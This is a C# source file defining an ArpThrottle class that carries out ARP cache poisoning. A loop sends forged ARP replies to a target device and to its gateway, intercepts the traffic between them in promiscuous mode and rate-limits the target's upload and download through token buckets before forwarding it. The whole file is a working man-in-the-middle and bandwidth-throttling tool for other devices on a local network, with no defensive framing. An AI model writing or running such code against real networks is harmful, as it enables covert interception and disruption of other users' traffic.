using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpThrottle : IDisposable
{
    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly TokenBucket _uploadBucket;
    private readonly TokenBucket _downloadBucket;
    private readonly CancellationTokenSource _cts = new();
    private PhysicalAddress _gatewayMac;
    private long _txBytes;
    private long _rxBytes;

    public ArpThrottle(
        string targetIp,
        string targetMac,
        string gatewayIp,
        string ifaceHint,
        string localIp,
        int uploadKbps,
        int downloadKbps)
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _uploadBucket = new TokenBucket(uploadKbps);
        _downloadBucket = new TokenBucket(downloadKbps);
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));

        NetworkHelper.EnableIpForwarding(_device.Description);
        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        _device.Filter = $"ip and host {_targetIp}";

        NetworkHelper.EmitJson(new
        {
            type = "started",
            mode = "throttle",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            engine = "native"
        });

        _device.OnPacketArrival += OnPacket;
        var poisonTask = Task.Run(PoisonLoop, _cts.Token);
        var emitTask = Task.Run(EmitLoop, _cts.Token);

        try
        {
            _device.Capture();
        }
        catch (OperationCanceledException)
        {
            // shutting down
        }
        finally
        {
            _device.OnPacketArrival -= OnPacket;
            try { _device.StopCapture(); } catch { /* ignore */ }
            try { _device.Close(); } catch { /* ignore */ }
            _cts.Cancel();
            Task.WaitAll(new[] { poisonTask, emitTask }, 2000);
        }
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                MitmForwarder.SendArpReply(_device, _ourMac, _targetMac, _targetMac, IPAddress.Parse(_targetIp), IPAddress.Parse(_gatewayIp));
                MitmForwarder.SendArpReply(_device, _ourMac, _gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }

            Thread.Sleep(1500);
        }
    }

    private void EmitLoop()
    {
        long lastTx = 0, lastRx = 0;
        var lastT = DateTime.UtcNow;

        while (!_cts.IsCancellationRequested)
        {
            Thread.Sleep(2000);
            var now = DateTime.UtcNow;
            var dt = (now - lastT).TotalSeconds;
            if (dt <= 0) continue;

            long tx, rx;
            lock (this)
            {
                tx = _txBytes - lastTx;
                rx = _rxBytes - lastRx;
                lastTx = _txBytes;
                lastRx = _rxBytes;
            }

            lastT = now;
            NetworkHelper.EmitJson(new
            {
                type = "traffic",
                ip = _targetIp,
                mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
                upload = Math.Round(Math.Max(0, (tx * 8.0) / (dt * 1024 * 1024)), 3),
                download = Math.Round(Math.Max(0, (rx * 8.0) / (dt * 1024 * 1024)), 3)
            });
        }
    }

    private void OnPacket(object? sender, PacketCapture e)
    {
        try
        {
            var raw = e.GetPacket();
            var packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            if (packet is not EthernetPacket eth || eth.PayloadPacket is not IPv4Packet ip)
            {
                return;
            }

            var length = ip.TotalLength > 0 ? ip.TotalLength : ip.Bytes.Length;

            if (ip.SourceAddress.ToString() == _targetIp)
            {
                if (!_uploadBucket.Allow(length)) return;
                lock (this) { _txBytes += length; }
                MitmForwarder.ForwardIp(_device, _ourMac, ip, _gatewayMac);
            }
            else if (ip.DestinationAddress.ToString() == _targetIp)
            {
                if (!_downloadBucket.Allow(length)) return;
                lock (this) { _rxBytes += length; }
                MitmForwarder.ForwardIp(_device, _ourMac, ip, _targetMac);
            }
        }
        catch
        {
            // ignore
        }
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
        try { _device.Close(); } catch { /* ignore */ }
    }
}
